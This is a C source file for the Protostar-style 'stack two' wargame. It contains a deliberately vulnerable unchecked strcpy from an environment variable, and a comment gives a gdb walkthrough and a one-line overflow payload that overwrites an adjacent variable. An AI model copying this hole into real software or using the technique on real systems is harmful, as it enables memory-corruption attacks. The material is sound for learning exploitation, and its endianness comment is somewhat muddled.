#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
/* Solution:
   export GREENIE=AAAAAAAAAAA
   gdb ./stackTwo
      run
      disassamble main
      -dm>    0x00005555555551c6 <+81>:	call   0x555555555040 <strcpy@plt>
      break *0x00005555555551c6
      run
      -dm>    0x000055555555518b <+22>:	call   0x555555555030 <getenv@plt>
      -dm>    0x0000555555555190 <+27>:	mov    QWORD PTR [rbp-0x8],rax
      x $rax
      -> 0x7fffffffe0b0:	0x41414141
      -dm>   0x00005555555551c6 <+81>:	call   0x555555555040 <strcpy@plt>
      -dm>   0x00005555555551cb <+86>:	mov    eax,DWORD PTR [rbp-0xc]
      x $rbp-0xc
      -> 0x7fffffffe0f4:	0x00000000
    python -c "print 0x7fffffffe0f4 - 0x7fffffffe0b0"
    -> 68
    shell:
    export GREENIE=$(python -c 'print "A"*68 + "\n\r\n\r"'); ./stackTwo
 * */
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);
  // python: "0d0a0d0a".decode("hex") -> '\r\n\r\n' -> for big endian this is \n\r\n\r
  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
